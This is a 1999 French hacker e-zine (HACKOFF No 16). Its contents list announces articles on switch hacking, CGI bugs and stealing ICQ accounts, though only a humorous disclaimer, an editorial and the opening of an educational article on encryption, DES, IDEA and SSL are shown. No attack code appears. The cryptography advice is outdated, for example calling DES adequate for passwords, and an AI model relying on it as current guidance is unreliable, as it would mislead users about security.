<body background="bhackoff.jpg" alink="#c0c0c0" vlink="#202020" link="#202020"><B>
<pre>            14.07.99              - H@CKOFF No16 - * Cryptus-securito * - 

  
<FONT COLOR="#FF0000">°</FONT><FONT COLOR="#FC0003">º</FONT><FONT COLOR="#F90006">¤</FONT><FONT COLOR="#F60009">ø</FONT><FONT COLOR="#F3000C">,</FONT><FONT COLOR="#F0000F">¸</FONT><FONT COLOR="#ED0012">¸</FONT><FONT COLOR="#EA0015">,</FONT><FONT COLOR="#E70018">ø</FONT><FONT COLOR="#E4001B">¤</FONT><FONT COLOR="#E1001E">º</FONT><FONT COLOR="#DE0021">°</FONT><FONT COLOR="#DB0024">`</FONT><FONT COLOR="#D80027">°</FONT><FONT COLOR="#D5002A">º</FONT><FONT COLOR="#D2002D">¤</FONT><FONT COLOR="#CF0030">ø</FONT><FONT COLOR="#CC0033">,</FONT><FONT COLOR="#C90036">¸</FONT><FONT COLOR="#C60039">¸</FONT><FONT COLOR="#C3003C">,</FONT><FONT COLOR="#C0003F">ø</FONT><FONT COLOR="#BD0042">¤</FONT><FONT COLOR="#BA0045">º</FONT><FONT COLOR="#B70048">°</FONT><FONT COLOR="#B4004B">`</FONT><FONT COLOR="#B1004E">°</FONT><FONT COLOR="#AE0051">º</FONT><FONT COLOR="#AB0054">¤</FONT><FONT COLOR="#A80057">ø</FONT><FONT COLOR="#A5005A">,</FONT><FONT COLOR="#A2005D">¸</FONT><FONT COLOR="#9F0060">¸</FONT><FONT COLOR="#9C0063">,</FONT><FONT COLOR="#990066">ø</FONT><FONT COLOR="#960069">¤</FONT><FONT COLOR="#93006C">º</FONT><FONT COLOR="#90006F">°</FONT><FONT COLOR="#8D0072">`</FONT><FONT COLOR="#8A0075">°</FONT><FONT COLOR="#870078">º</FONT><FONT COLOR="#84007B">¤</FONT><FONT COLOR="#81007E">º</FONT><FONT COLOR="#7E0081">°</FONT><FONT COLOR="#7B0084">`</FONT><FONT COLOR="#780087">°</FONT><FONT COLOR="#75008A">º</FONT><FONT COLOR="#72008D">¤</FONT><FONT COLOR="#6F0090">ø</FONT><FONT COLOR="#6C0093">,</FONT><FONT COLOR="#690096">¸</FONT><FONT COLOR="#660099">¸</FONT><FONT COLOR="#63009C">,</FONT><FONT COLOR="#60009F">ø</FONT><FONT COLOR="#5D00A2">¤</FONT><FONT COLOR="#5A00A5">º</FONT><FONT COLOR="#5700A8">°</FONT><FONT COLOR="#5400AB">`</FONT><FONT COLOR="#5100AE">°</FONT><FONT COLOR="#4E00B1">º</FONT><FONT COLOR="#4B00B4">¤</FONT><FONT COLOR="#4800B7">ø</FONT><FONT COLOR="#4500BA">,</FONT><FONT COLOR="#4200BD">¸</FONT><FONT COLOR="#3F00C0">¸</FONT><FONT COLOR="#3C00C3">,</FONT><FONT COLOR="#3900C6">ø</FONT><FONT COLOR="#3600C9">¤</FONT><FONT COLOR="#3300CC">º</FONT><FONT COLOR="#3000CF">°</FONT><FONT COLOR="#2D00D2">`</FONT><FONT COLOR="#2A00D5">°</FONT><FONT COLOR="#2700D8">º</FONT><FONT COLOR="#2400DB">¤</FONT><FONT COLOR="#2100DE">ø</FONT><FONT COLOR="#1E00E1">,</FONT><FONT COLOR="#1B00E4">¸</FONT><FONT COLOR="#1800E7">¸</FONT><FONT COLOR="#1500EA">,</FONT><FONT COLOR="#1200ED">ø</FONT>
   
         _/    _/    _/_/      _/_/_/  _/    _/    _/_/    _/_/_/_/ _/_/_/_/      
        _/    _/  _/    _/  _/        _/  _/    _/    _/  _/       _/
       _/_/_/_/  _/_/_/_/  _/        _/_/      _/    _/  _/_/_/   _/_/_/
      _/    _/  _/    _/  _/        _/  _/    _/    _/  _/        /
     _/    _/  _/    _/    _/_/_/  _/    _/    _/_/    _/       _/   
 
<FONT COLOR="#FF0000">°</FONT><FONT COLOR="#FC0003">º</FONT><FONT COLOR="#F90006">¤</FONT><FONT COLOR="#F60009">ø</FONT><FONT COLOR="#F3000C">,</FONT><FONT COLOR="#F0000F">¸</FONT><FONT COLOR="#ED0012">¸</FONT><FONT COLOR="#EA0015">,</FONT><FONT COLOR="#E70018">ø</FONT><FONT COLOR="#E4001B">¤</FONT><FONT COLOR="#E1001E">º</FONT><FONT COLOR="#DE0021">°</FONT><FONT COLOR="#DB0024">`</FONT><FONT COLOR="#D80027">°</FONT><FONT COLOR="#D5002A">º</FONT><FONT COLOR="#D2002D">¤</FONT><FONT COLOR="#CF0030">ø</FONT><FONT COLOR="#CC0033">,</FONT><FONT COLOR="#C90036">¸</FONT><FONT COLOR="#C60039">¸</FONT><FONT COLOR="#C3003C">,</FONT><FONT COLOR="#C0003F">ø</FONT><FONT COLOR="#BD0042">¤</FONT><FONT COLOR="#BA0045">º</FONT><FONT COLOR="#B70048">°</FONT><FONT COLOR="#B4004B">`</FONT><FONT COLOR="#B1004E">°</FONT><FONT COLOR="#AE0051">º</FONT><FONT COLOR="#AB0054">¤</FONT><FONT COLOR="#A80057">ø</FONT><FONT COLOR="#A5005A">,</FONT><FONT COLOR="#A2005D">¸</FONT><FONT COLOR="#9F0060">¸</FONT><FONT COLOR="#9C0063">,</FONT><FONT COLOR="#990066">ø</FONT><FONT COLOR="#960069">¤</FONT><FONT COLOR="#93006C">º</FONT><FONT COLOR="#90006F">°</FONT><FONT COLOR="#8D0072">`</FONT><FONT COLOR="#8A0075">°</FONT><FONT COLOR="#870078">º</FONT><FONT COLOR="#84007B">¤</FONT><FONT COLOR="#81007E">º</FONT><FONT COLOR="#7E0081">°</FONT><FONT COLOR="#7B0084">`</FONT><FONT COLOR="#780087">°</FONT><FONT COLOR="#75008A">º</FONT><FONT COLOR="#72008D">¤</FONT><FONT COLOR="#6F0090">ø</FONT><FONT COLOR="#6C0093">,</FONT><FONT COLOR="#690096">¸</FONT><FONT COLOR="#660099">¸</FONT><FONT COLOR="#63009C">,</FONT><FONT COLOR="#60009F">ø</FONT><FONT COLOR="#5D00A2">¤</FONT><FONT COLOR="#5A00A5">º</FONT><FONT COLOR="#5700A8">°</FONT><FONT COLOR="#5400AB">`</FONT><FONT COLOR="#5100AE">°</FONT><FONT COLOR="#4E00B1">º</FONT><FONT COLOR="#4B00B4">¤</FONT><FONT COLOR="#4800B7">ø</FONT><FONT COLOR="#4500BA">,</FONT><FONT COLOR="#4200BD">¸</FONT><FONT COLOR="#3F00C0">¸</FONT><FONT COLOR="#3C00C3">,</FONT><FONT COLOR="#3900C6">ø</FONT><FONT COLOR="#3600C9">¤</FONT><FONT COLOR="#3300CC">º</FONT><FONT COLOR="#3000CF">°</FONT><FONT COLOR="#2D00D2">`</FONT><FONT COLOR="#2A00D5">°</FONT><FONT COLOR="#2700D8">º</FONT><FONT COLOR="#2400DB">¤</FONT><FONT COLOR="#2100DE">ø</FONT><FONT COLOR="#1E00E1">,</FONT><FONT COLOR="#1B00E4">¸</FONT><FONT COLOR="#1800E7">¸</FONT><FONT COLOR="#1500EA">,</FONT><FONT COLOR="#1200ED">ø</FONT>
   
    _________________________________________________________________________
   /                                                                         \
  /   Bienvenue dans ce Hackoff No 16 Cryptus edition. (sous le signe de la  |
 / savate absolument!). Au sommaire de ce numero 16 on vous propose un txt   /
|  sur les echanges securises, de la crypto, du hack sur les switches, les  /
\      bugs de CGI, et comment piquer un UIN sur ICQ grace a linux.        /
 \________________________________________  ______________________________/
                                          \ |
                                           \|   
                                       __________                             
                                   .,:;>The Crew<;:,.                         
                                      /  .Silk.  \           
                                     /  .Tobozo.  \
____________________________________/  ..Yopyop..  \_____________________________
 <FONT COLOR="#FF0000">¦</FONT><FONT COLOR="#FB0004">§</FONT><FONT COLOR="#F70008">¨</FONT><FONT COLOR="#F3000C">©</FONT><FONT COLOR="#EF0010">ª</FONT><FONT COLOR="#EB0014">«</FONT><FONT COLOR="#E70018">¬</FONT><FONT COLOR="#E3001C">-</FONT><FONT COLOR="#DF0020">®</FONT><FONT COLOR="#DB0024">¯</FONT><FONT COLOR="#D70028">°</FONT><FONT COLOR="#D3002C">±</FONT><FONT COLOR="#CF0030">²</FONT><FONT COLOR="#CB0034">³</FONT><FONT COLOR="#C70038">´</FONT><FONT COLOR="#C3003C">µ</FONT><FONT COLOR="#BF0040">·</FONT><FONT COLOR="#BB0044">¸</FONT><FONT COLOR="#B70048">¹</FONT><FONT COLOR="#B3004C">º</FONT><FONT COLOR="#AF0050">»</FONT><FONT COLOR="#AB0054">¿</FONT><FONT COLOR="#A70058">ø</FONT><FONT COLOR="#A3005C">Ø</FONT><FONT COLOR="#9F0060">Þ</FONT><FONT COLOR="#9B0064">þ</FONT><FONT COLOR="#970068">æ</FONT><FONT COLOR="#93006C">¡</FONT><FONT COLOR="#8F0070">¢</FONT><FONT COLOR="#8B0074">£</FONT><FONT COLOR="#870078">¤</FONT><FONT COLOR="#83007C">¥</FONT><FONT COLOR="#7F0080"> </FONT><FONT COLOR="#7B0084">¦</FONT>/  ..Sniffdoz..  \<FONT COLOR="#73008C">§</FONT><FONT COLOR="#6F0090">¨</FONT><FONT COLOR="#6B0094">©</FONT><FONT COLOR="#670098">ª</FONT><FONT COLOR="#63009C">«</FONT><FONT COLOR="#5F00A0">¬</FONT><FONT COLOR="#5B00A4">-</FONT><FONT COLOR="#5700A8">®</FONT><FONT COLOR="#5300AC">¯</FONT><FONT COLOR="#4F00B0">°</FONT><FONT COLOR="#4B00B4">±</FONT><FONT COLOR="#4700B8">²</FONT><FONT COLOR="#4300BC">³</FONT><FONT COLOR="#3F00C0">´</FONT><FONT COLOR="#3B00C4">µ</FONT><FONT COLOR="#3700C8">·</FONT><FONT COLOR="#3300CC">¸</FONT><FONT COLOR="#2F00D0">¹</FONT><FONT COLOR="#2B00D4">º</FONT><FONT COLOR="#2700D8">»</FONT><FONT COLOR="#2300DC">¿</FONT><FONT COLOR="#1F00E0">ø</FONT><FONT COLOR="#1B00E4">Ø</FONT><FONT COLOR="#1700E8">Þ</FONT><FONT COLOR="#1300EC">þ</FONT><FONT COLOR="#0F00F0">æ</FONT><FONT COLOR="#0B00F4">¡</FONT><FONT COLOR="#0700F8">¢</FONT>
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯/  ....Blured....  \¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
                                 /  .....Misto!.....  \
                                /  ........NK........  \
                     ----8<----+-----8<--------8<-------\---8<--+-------8<---
                              /___________....___________\
                                                             

                   ____________________________________________________________ 
 __________       /   <FONT COLOR="#FF0000">T</FONT><FONT COLOR="#F0000F">a</FONT><FONT COLOR="#E1001E">b</FONT><FONT COLOR="#D2002D">L</FONT><FONT COLOR="#C3003C">e</FONT><FONT COLOR="#B4004B"> </FONT><FONT COLOR="#A5005A">d</FONT><FONT COLOR="#960069">e</FONT><FONT COLOR="#870078">s</FONT><FONT COLOR="#780087"> </FONT><FONT COLOR="#690096">m</FONT><FONT COLOR="#5A00A5">A</FONT><FONT COLOR="#4B00B4">t</FONT><FONT COLOR="#3C00C3">i</FONT><FONT COLOR="#2D00D2">è</FONT><FONT COLOR="#1E00E1">r</FONT><FONT COLOR="#0F00F0">e</FONT><FONT COLOR="#0000FF">s</FONT> :                                     \
/ HACK0ff  \     |¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯|
]-=v0L 16=-[     |     [1]<a href="#*1*">Disclaimer</a>                          Tobozo            |
\Juillet 99/     |     [2]<a href="#*2*">Les echanges securises sur le net</a>   Sniffdoz          |
 ¯¯¯¯¯¯¯¯¯¯      |     [3]<a href="#*3*">Comment hacker un switch</a>            Sniffdoz          |
                 |     [4]<a href="#*4*">PKI (cryptologie)</a>                   Sniffdoz          |
                 |     [5]<a href="#*5*">Cgi et bugs</a>                         Yopyop            |
                 |     [6]<a href="#*6*">ICQ password</a>                        Tobozo&Yopyop     |
                 |                                                              |
---------8<------+--------------8<---------------------8<---------------------8<-
                 ¦
                 : 
                 . 
<a name="*1*">                     _        _______________________        _
-*1*-                 `^°*;:,.> <FONT COLOR="#FF0000">Ð</FONT><FONT COLOR="#F1000E"> </FONT><FONT COLOR="#E3001C">ï</FONT><FONT COLOR="#D5002A"> </FONT><FONT COLOR="#C70038">$</FONT><FONT COLOR="#B90046"> </FONT><FONT COLOR="#AB0054">©</FONT><FONT COLOR="#9D0062"> </FONT><FONT COLOR="#8F0070">£</FONT><FONT COLOR="#81007E"> </FONT><FONT COLOR="#73008C">Å</FONT><FONT COLOR="#65009A"> </FONT><FONT COLOR="#5700A8">ï</FONT><FONT COLOR="#4900B6"> </FONT><FONT COLOR="#3B00C4">M</FONT><FONT COLOR="#2D00D2"> </FONT><FONT COLOR="#1F00E0">Ê</FONT><FONT COLOR="#1100EE"> </FONT><FONT COLOR="#0300FC">®</FONT> <.,:;*°^`
_____________________________/¯¯¯¯¯¯¯By Tobozo¯¯¯¯¯¯¯\___________________________

</pre>
<table border=0 width=640><tr><td>
<font size="-1">
<B><p align="justify">
L'acces a ce document impose la lecture de ce (petit) disclaimer :<BR>
Ce hackoff est un magazine qui traite de differents sujets sur differents tons
(normal on est plusieurs a faire les articles), il ne faut donc pas se formaliser
de l'apparence laxiste des propos rencontres ici, cependant la lecture du contenu
de ce fichier requiert d'appartenir a un certain type de population.<BR>
Pour etre autorise a lire les informations qui suivent, il faut etre 
boutonneux avec des lunettes, asociable, grunge, buveur de bieres, fumeur de 
joints, et passer plus de 15 heures par jour devant son ordi. 
Il faut etre equipe du materiel suivant (au minimum) : <BR>
-Un micro-ordinateur avec affichage 256 couleurs et une resolution de 640*xxx<BR>
-Deux yeux en etat de fonctionnement (75% suffiront)<BR>
-Un interpreteur html a affichage graphique (sorry pour ceux qui ont lynx)<BR>
-La capacite de savoir lire le francais d'une facon soutenue<BR>
-Le numero de l'horloge parlante de Hong-Kong<BR>
Si un de ces elements vient a manquer, ne lisez pas ce document, vous n'y etes
pas autorises (et surtout vous n'y arriverez pas)! 
En accedant a la suite du document, vous reconnaissez appartenir a cette
categorie et vous exposez donc a un traitement au biactol autant qu'a des 
visites frequentes chez votre ophtalmo. Sans parler du delire obsessionel que
vous allez vous faire en vous demandant a quoi peut bien servir le numero de 
telephone de l'horloge parlante de hong-kong.<BR>
</b></font>
</td></tr></table>
<pre>
¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸
</pre>
<table border=0 width=640><tr><td>
<B><p align="justify">
function Edito()<BR>
<BR>
L'ethique sympathique du nordique boulimique de techniques automatiques nous
explique que le fric n'est pas chic et que si on applique a la rethorique un 
lexique cyclique a des fins idylliques, on provoque un declic et on devient un
sadique de l'informatique. C'est la qu'est le hic, donc je prends mon bic et
je prouve par la pratique et par mon historique qu'une bonne dose de frolic
chaque matin c'est caustique. Sans aucune mnemonique, je fais la nique aux flics
et reste categorique : le joystick en quantite astronomique, ca vaut pas un bon
stick.<BR>
<BR>
Tobozic
</b></font>
</td></tr></table>
<pre>

¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸
</pre>
<BR><BR><BR><BR><BR><BR><BR><pre>
<a name="*2*">           _        ________________________________________        _
-*2*-       `^°*;:,.>  <FONT COLOR="#FF0000">L</FONT><FONT COLOR="#F80007">e</FONT><FONT COLOR="#F1000E">s</FONT><FONT COLOR="#EA0015"> </FONT><FONT COLOR="#E3001C">e</FONT><FONT COLOR="#DC0023">c</FONT><FONT COLOR="#D5002A">h</FONT><FONT COLOR="#CE0031">a</FONT><FONT COLOR="#C70038">n</FONT><FONT COLOR="#C0003F">g</FONT><FONT COLOR="#B90046">e</FONT><FONT COLOR="#B2004D">s</FONT><FONT COLOR="#AB0054"> </FONT><FONT COLOR="#A4005B">s</FONT><FONT COLOR="#9D0062">e</FONT><FONT COLOR="#960069">c</FONT><FONT COLOR="#8F0070">u</FONT><FONT COLOR="#880077">r</FONT><FONT COLOR="#81007E">i</FONT><FONT COLOR="#7A0085">s</FONT><FONT COLOR="#73008C">e</FONT><FONT COLOR="#6C0093">s</FONT><FONT COLOR="#65009A"> </FONT><FONT COLOR="#5E00A1">s</FONT><FONT COLOR="#5700A8">u</FONT><FONT COLOR="#5000AF">r</FONT><FONT COLOR="#4900B6"> </FONT><FONT COLOR="#4200BD">l</FONT><FONT COLOR="#3B00C4">e</FONT><FONT COLOR="#3400CB"> </FONT><FONT COLOR="#2D00D2">n</FONT><FONT COLOR="#2600D9">e</FONT><FONT COLOR="#1F00E0">t</FONT>   <.,:;*°^`
___________________/¯¯¯¯¯¯¯¯¯¯¯¯¯¯By Sniffdoz¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\_____________________

</pre>
<table border=0 width=640><tr><td>
<h2><b> Introduction aux échanges sécurisés sur l'Internet</b></h2>
<p align="justify"><font face="tahoma" size="-2"><B>
<UL TYPE=DISC>
  <LI><A HREF="#debut">1.	PRÉSENTATION D'ENSEMBLE</A>
  <li><A HREF="#presentation">2.	PRÉSENTATION DU SCELLEMENT ET CHIFFREMENT</A>
  <LI><A HREF="#techno">2.1.	Les technologies de chiffrement</a>
  <LI><A HREF="#scellement">2.2.	Les technologies de scellement et de signature</A>
  <LI><A HREF="#preco">3.	PRÉCONISATIONS EN MATIÈRE DE CHIFFREMENT ET DE SCELLEMENT</A>
  <LI><A HREF="#algo">3.1.	Les algorithmes</A>
  <A HREF="#tableau"><LI>3.2.	Synthèse :Tableau récapitulatif des différents algorithmes</A>
  <LI><A HREF="#cerificat">4.	LES CERTIFICATS</A>
  <LI><A HREF="#prescert">4.1.	Présentation</A>
  <LI><A HREF="#x509">4.2.	Le certificat X509</A>
  <LI><A HREF="#protocole">5.	LES PROTOCOLES DE MISE EN UVRE</A>
  <LI><A HREF="#ssl">5.1.	SSL</A>
  <LI><A HREF="#acteur">5.1.1.	Acteur</A>
  <LI><A HREF="#principe">5.1.2.	Principes techniques</A>
  <LI><A HREF="#etabli">5.1.3.	Etablissement des communications avec SSL</A>
  <LI><A HREF="#compare">5.1.4.	Comparaison entre SSL V3 et SSL V2</A>
  <LI><A HREF="#compati">5.1.5.	Compatibilité V2/V3 </A>
  <LI><A HREF="#fire">5.1.6.	SSL et les Firewalls</A>
  <LI><A HREF="#mise">5.1.7.	Mise en uvre</A>
  <LI><A HREF="#certification">5.2.	LA CERTIFICATION ET SSL</A>
  <LI><A HREF="#obtenir">5.2.1.	Comment obtenir un certificat SSL ?	</A>
  <LI><A HREF="#type">5.2.2.	Les différents types de certificats</A>
  <LI><A HREF="#shttp">5.4.	LE PROTOCOLE S-HTTP (SECURE HYPERTEXT TRANSFER PROTOCOL)</A>
  <LI><A HREF="#bebutsh">5.4.1.	Présentation</A>
  <LI><A HREF="#mecanisme">5.4.2.	Mécanisme général</A>
  <LI><A HREF="#general">5.4.3.	Considérations générales</A>
  <LI><A HREF="#messages">5.4.4.	Le chiffrement des messages</A>
  <LI><A HREF="#auth">5.4.5.	L'authentification</A>
  <LI><A HREF="#integrite">5.4.6.	L'intégrité du message</A>
  <LI><A HREF="#clair">5.4.7.	Le mécanisme de récupération du message en clair</A>
  <LI><A HREF="#shttpssl">5.4.8.	Comparaison de S-HTTP et de SSL</A>
  <LI><A HREF="#support">5.4.9.	Algorithmes supportés</A>
  <LI><A HREF="#synthese">5.4.10.	Synthèse</A>
  <LI><A HREF="#pct">5.5.	LE PROTOCOLE PCT (MICROSOFT)</A>
  <LI><A HREF="#kro">5.5.1.	Présentation</A>
  <LI><A HREF="#syntpct">5.5.2.	Synthèse	32</A>
  <LI><A HREF="#tls">5.6.	TLS</A>
  <LI><A HREF="#prestls">5.6.1.	Présentation</a>
  <LI><A HREF="#base">5.6.2.	Principe de base</A>
  <LI><A HREF="#synttls">5.6.3.	Synthèse</A>
 </UL>
</font></b>
<A NAME="debut"><b><h3>1. Présentation d'ensemble</h3></b><p align="justify"></A>

Aujourd'hui la solution la plus pertinente pour sécuriser les opérations sur Internet est SSL. La plus pertinente 
parce que la plus simple aussi bien pour l'utilisateur (client) que l'administrateur (serveur), et parce que tous
les navigateurs Web récents intègrent, en standard, cette technologie. La plus pertinente car elle permet aussi 
bien d'authentifier les deux parties (s'assurer que chacun est bien qui il dit être) que de chiffrer les données 
échangées.

La sécurité des échanges au sein des transactions applicatives (essentiellement financières) met en uvre trois catégories de concepts :

<UL>
  <LI>	des technologies de chiffrement / scellement (RSA, DES, RC2, RC4, RC5, MD5, Certificats X509, etc.)
  <LI>	des protocoles de mise en uvre de ces technologies (SSL, PCT, TLS, etc.)
</UL>

<p align="justify">
Le but de la sécurité des échanges est d'assurer la confidentialité, lorsque cela est nécessaire et légal, ainsi que l'identification et l'authentification des messages échangés. Les travaux sur ces domaines sont extrêmement importants, compte tenu des enjeux représentés par le commerce électronique et il est probable que les retombées de ces travaux concerneront toutes les entreprises dans leur objectif de protection contre les intrusions et le piratage.
</p>

<A NAME="presentation"><h3><b>2 PRÉSENTATION DU SCELLEMENT ET CHIFFREMENT</b></h3></A>
<A NAME="techno"><h4><b>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp2.1 Les technologies de chiffrement</b></h4></A>

Le chiffrement consiste à transformer un message clair en un message incompréhensible sans la connaissance d'un secret. Les technologies de chiffrement se classent en deux catégories :

<UL>
  <LI>le chiffrement à clés privées (symétrique)
  <LI>le chiffrement à clés publiques (asymétrique)
</UL>

<p align="justify">
Les technologies de chiffrement à clés privéess permettent le chiffrement / déchiffrement d'un message à l'aide
d'une même clé, connue des deux interlocuteurs. Ces techniques algorithmiques sont très connues depuis de 
nombreuses années. La plus célèbre est l'algorithme DES (1974). Internet utilise fortement les algorithmes RC2, 
RC4 ou RC5. 
</p>
Les avantages de ces méthodes sont leur très grande performance, ainsi que leur relative simplicité permettant de 
les implémenter dans des cartes à microprocesseur.<br>
Les inconvénients de ces méthodes résident dans l'obligation de s'échanger au préalable les clés utilisées, 
au travers d'un canal que l'on souhaite bien évidemment sûr.<br>
<p align="justify">

Les technologies de chiffrement à clés publiques s'appuient sur un couple de clés (Kpri,Kpub) corrélées. 
L'une de ces clés est considérée comme publique, l'autre est conservée comme privée. La connaissance de la clé 
publique est supposée (à juste titre jusqu'ici) ne pas permettre la découverte de la clé privée (corrélation 
mathématique).
<p align="justify">
Ces deux clés sont symétriques et l'une d'elle peut être utilisée pour le chiffrement, l'autre pour le 
déchiffrement. L'usage habituel est bien sûr d'utiliser Kpub du correspondant pour lui envoyer un message 
chiffré que lui seul (en possession de la clé Kpriv correspondante) peut alors déchiffrer.
<p align="justify">
L'avantage de cette méthode est à l'évidence sa très grande souplesse quant à l'échange de clés (pas de 
besoin de canal sûr).
<p align="justify">
L'inconvénient le plus connu de ces techniques est leur relative lourdeur les rendant peu aptes à être utilisées 
pour du chiffrement en ligne.
<p align="justify">
L'algorithme le plus connu est RSA (du nom de ses inventeurs Rivest Shamir et Adleman). Une approche de plus en
plus commune consiste à utiliser RSA (ou ses dérivés) pour négocier une clé privée de session qui sera utilisée 
pour un DES ou RC2 au cours des échanges qui suivent. Cette approche cumule les avantages des deux technologies et 
en évite les inconvénients

<p align="justify">
<A NAME="scellement"><h4><b>2.2 Les technologies de scellement et de signature</b></h4></A>
<p align="justify">

Le scellement et la signature consistent à adjoindre à un message une chaîne complémentaire calculée à partir du message et appuyée sur l'usage d'une clé de chiffrement. Cette technique a pour objectif de garantir qu'un tiers non impliqué n'a pu ni fabriquer le message (concept de signature garantissant l'authenticité), ni l'altérer (concept d'intégrité).
<p align="justify">
La technique utilisée est en général très simple :
<UL>
  <LI>	fabrication d'un résumé du message (" digest "), en général fondé sur une mécanique de type MD5 (Message Digest 5);
  <LI>	chiffrement du résumé MD5 par la clé privée de l'émetteur de ce résumé; le récepteur (quel qu'il soit) peut alors recalculer le résumé (MD5), déchiffrer le sceau avec la clé publique de l'émetteur et effectuer la comparaison;
  <LI>	une comparaison réussie garantie intégrité et authenticité du message (puisque la fabrication du sceau nécessite la connaissance de la clé privée de l'émetteur). Cette approche est classiquement utilisée dans la signature électronique apposée par les tiers de confiance sur les certificats X509 que nous abordons plus loin.
</UL>

A titre d'information, l'identification / authentification forte par signature électronique est bien plus puissante que les fonctions assurées par les pare-feu, en effet :
<UL>
  <LI>	les pare-feu proposent une identification / authentification initiale du correspondant et laissent ensuite se dérouler les échanges de manière naturelle, sans intervention autre que les contrôles normaux d'un sas applicatif; un attaquant, inséré en coupure de flux depuis le début peut laisser se dérouler la phase d'identification / authentification initiale et altérer ensuite le flux!
  <LI>	l'identification / authentification par signature électronique se fait à chaque message et ne laisse pas la place à un attaquant, même en coupure; il s'agit d'une technique très forte dont l'avenir est certain.
</UL>
<A NAME="preco"><h4><b>3. PRÉCONISATIONS EN MATIÈRE DE CHIFFREMENT ET DE SCELLEMENT</b></h4></A>
<p align="justify">
Le but de ce paragraphe est de présenter les standards et les recommandations de mise en uvre.
<p align="justify">
<A NAME="algo"><b>3.1. Les algorithmes</b></A>
<p align="justify">
<h4><b>Le DES (Data Encryption Standard)</b></h4><p align="justify">
Le DES est certainement l'un des algorithmes à clé privée les plus utilisés, son origine remonte à 1974, il est d'origine IBM, mais a souffert d'une implication de la NSA (National Security Agency) qui fît naître une polémique quant à une backdoor éventuelle.
Techniquement, le DES travaille sur des blocs de texte clair de 64 bits qu'il divise en 2 fois 32 bits, qui sont ensuite permutés et substitués selon un mécanisme identique (ronde) 16 fois de suite. Chaque bloc de texte clair ressort après son traitement en un bloc de longueur équivalente chiffré.
Le DES utilise une clé de chiffrement de 64 bits, dont en réalité seulement 56 sont effectifs, les autres étant des bits de parité. Tout nombre de 56 bits peut donc être utilisé,  a chaque itération du processus, les bits de la clé sont décalés. Le déchiffrement du texte suit exactement  la même logique en inversant simplement l'ordre d'utilisation des clés.
<p align="justify">
La sécurité du DES :
<p align="justify">
Malgré de nombreux démentis, émanant de la NSA et des créateurs du DES, des doutes subsistent quant à sa robustesse (faiblesse de certaines clés, constitution ésotérique des tables-S, nombre de rondes insuffisant). Pour autant les cryptanalyses différentielles, linéaires ou encore à clés corrélées n'ont pas démontré de faiblesse notoire, l'attaque par force brute restant la plus efficace.
Le coût d'une machine destinée à casser le DES par attaque exhaustive était estimé en 1987 à moins 10 Millions de $, La rumeur dit que la NSA peut casser un DES en 15 minutes maximum  avec une machine estimée à 50 000$.
.(ce qui au passage montre que les estimations faites 10 ans plus tôt étaient surévaluées).
<p align="justify">
Pendant longtemps, vu que la NSA (l'agence de sécurité nationale amércaines, encore plus secrete que la CIA) était intervenue dans la conception de l'algorithme,
on a pensait qu'il pouvait présenter un trou de sécurité, notamment dans les huit tables de substitution qui n'ont jamais était justifiées ni par IBM ni par la NSA.
Si un tel trou de sécurité avait existé, il aurait permis à la NSA de décrypter aisement tous les messages codés par le DES sans que personne ne le sache.<br>
Après de nombreuses analyses par des spécialistes, une telle éventualité n'a jamais pu être démontré. En revanche, on considère aujourd'hui qu'une clef de 56 bits
résiste difficilement à une attaque systèmatique. Un défi dans ce sens est d'ailleurs proposé depuis trois ans par la société RSA Data Security :
le message crypté avec le DES a ainsi était dechiffré cette année en 22 heures et 15 mn par un réseau de 100 000 PC associé à une machine spéciale mise au point l'an dernier
par l'EFF (Electronic Frontier Foundation, association américaine de defense des droits civils dans la societe de l'information); pour ce faire, 245 millions de clefs se voyaient
testées chaque seconde. <br>
<p align="justify">
Afin d'améliorer la sécurité du DES, plusieurs variantes ont été mises au point, la plus repandue est le DES triple, qui consiste à chiffrer
le message clair avec une première clef, puis à appliquer l'algorithme à ce premier texte crypté en mode dechiffrement avec une deuxième clef et enfin à chiffrer à nouveau le résultat avec la première clef.
Cette méthode permet de simuler une clef de 112 bits. La solution actuellement envisagée consiste à définir un nouvelle algorithme, dénommé AES (Advanced Encryption Standard)
et s'appuyant sur des clefs de 128 bits.<br>
A titre d'exemple le Firewall M>WALL de Matranet ou Firewall-1 de checkpoint utilise dans son VPN un triple DES. Le triple DES est certainement hors d'atteinte aujourd'hui d'une attaque exhaustive.
<p align="justify">
Le DES reste un algorithme suffisant pour garantir la confidentialité des mots de passe dans le cadre d'une exploitation informatique (UNIX, MVS, NT), mais que la sécurité des échanges en environnement ouvert et non sûr, ne doit pas reposer uniquement sur lui. 
C'est d'ailleurs dans ce sens qu'il faut interpréter l'annonce périodique et à chaque fois repoussée de son remplacement  (il est en effet massivement mis en uvre).
<p align="justify">
<h4><b>IDEA</b></h4>
<p align="justify">
IDEA est un  algorithme récent qui date de 1990. Il manipule des blocs de données de 64 bits et utilise une clé de chiffrement de 128 bits. Le même algorithme est utilisé pour les déchiffrements. Chaque bloc est divisé en 4 blocs de 16 bits qui sont additionnés, multipliés, combinés par des ou exclusifs, entre eux et avec 6 sous blocs de 16 bits dérivés de la clé de chiffrement. Ces opérations sont effectuées 8 fois.
IDEA n'a pas été encore cryptanalysé , cet algorithme est actuellement hors de portée des processeurs du marché.
<p align="justify">
<h4><b>RC2 - RC4 - RC5</b></h4><p align="justify">
